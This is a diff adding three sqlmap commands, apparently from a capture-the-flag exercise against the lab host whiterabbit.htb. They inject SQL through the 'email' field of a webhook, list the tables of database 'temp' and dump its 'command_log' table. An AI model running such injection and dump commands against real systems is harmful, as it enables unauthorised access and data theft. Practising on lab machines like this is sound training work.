@@ -1,0 +1,5 @@
+sqlmap -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"   --method=POST   --data='{"campaign_id":1,"email":"test@ex.com*","message":"Clicked Link"}'   -p email   --headers="Content-Type: application/json"   --proxy http://127.0.0.1:8082   --batch --flush-session
+
+sqlmap --proxy=http://127.0.0.1:8082   -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"   --method=POST   --data='{"campaign_id":1,"email":"test@ex.com*","message":"Clicked Link"}'   -p email   --headers="Content-Type: application/json"   -D temp --tables --batch
+
+sqlmap --proxy=http://127.0.0.1:8082   -u "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"   --method=POST   --data='{"campaign_id":1,"email":"test@ex.com*","message":"Clicked Link"}'   -p email   --headers="Content-Type: application/json"   -D temp -T command_log --dump --batch
